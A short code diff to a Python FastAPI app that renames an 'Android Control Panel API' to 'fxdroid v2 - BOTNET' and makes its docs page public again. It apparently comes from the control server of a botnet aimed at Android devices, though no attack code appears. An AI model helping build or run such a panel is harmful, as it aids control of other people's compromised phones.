@@ -15,10 +15,9 @@ from routers.notification import notification
 
 # Create FastAPI app
 app = FastAPI(
-    title="Zeefer-Droid API",
-    description="Advanced Android Control Panel API",
-    version="1.0.0",
-    docs_url=None,
+    version="4.0",
+    title="fxdroid v2 - BOTNET",
+    description="fxdroid v2 - BOTNET",
     redoc_url=None,
 )
 
